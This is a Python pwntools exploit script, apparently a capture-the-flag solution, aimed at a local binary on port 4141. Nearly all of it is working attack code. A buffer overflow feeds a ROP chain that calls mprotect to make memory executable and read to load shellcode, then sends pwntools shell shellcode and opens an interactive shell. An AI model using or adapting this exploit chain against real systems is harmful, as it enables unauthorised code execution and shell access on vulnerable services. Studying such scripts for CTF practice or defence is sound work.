#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=127.0.0.1'
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './solution'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4141)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
heap = 0x0000000000567000
top = 0x400000

pop_rax = 0x0000000000403aa9 #: pop rax; ret;
pop_rdi = 0x000000000040edd7 #: pop rdi; dec dword ptr [rax + 0x21]; ret;
pop_rsi = 0x00000000004157b4 #: pop rsi; adc al, 0xf6; ret;
pop_rdx = 0x000000000041acda #: pop rdx; ret;
syscall = 0x000000000045d5b9 #: syscall; ret;

shellcode = asm(pwnlib.shellcraft.amd64.linux.sh())

io = start()

p = b''
p += b'A'*96

p += p64(pop_rax)
p += p64(heap)
p += p64(pop_rdi)
p += p64(top)
p += p64(pop_rsi)
p += p64(0x1000)
p += p64(pop_rdx)
p += p64(0x7)
p += p64(pop_rax)
p += p64(10) # mprotect
p += p64(syscall)

p += p64(pop_rax)
p += p64(heap)
p += p64(pop_rdi)
p += p64(0)
p += p64(pop_rsi)
p += p64(top)
p += p64(pop_rdx)
p += p64(0x1000)
p += p64(pop_rax)
p += p64(0) # read
p += p64(syscall)

p += p64(top)

#input()

io.recvuntil(': ')
io.sendline(p)

sleep(0.1)

io.sendline(shellcode)

io.interactive()

